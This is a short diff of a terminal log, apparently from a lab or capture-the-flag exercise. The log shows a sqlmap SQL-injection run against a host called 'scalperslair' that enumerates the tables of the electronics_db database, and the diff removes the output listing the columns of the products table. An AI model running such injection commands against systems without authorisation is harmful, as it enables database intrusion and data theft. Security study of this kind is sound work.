@@ -1,4 +1,4 @@
-└─$ sqlmap -u http://scalperslair/index.php?name=6090 --tables —columns --batch
+﻿└─$ sqlmap -u http://scalperslair/index.php?name=6090 --tables —columns --batch
         ___
        __H__
  ___ ___[,]_____ ___ ___  {1.8.9#stable}
@@ -39,21 +39,6 @@ Database: electronics_db
 +---------------------------------------+
 | products                              |
 +---------------------------------------+
-
-[14:57:55] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns
-[14:57:55] [INFO] fetching current database
-[14:57:55] [INFO] fetching columns for table 'products' in database 'electronics_db'
-Database: electronics_db
-Table: products
-[4 columns]
-+-------------+---------------+
-| Column      | Type          |
-+-------------+---------------+
-| description | text          |
-| name        | varchar(100)  |
-| id          | int(11)       |
-| price       | decimal(10,2) |
-+-------------+---------------+
 
 [14:57:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/scalperslair'
 
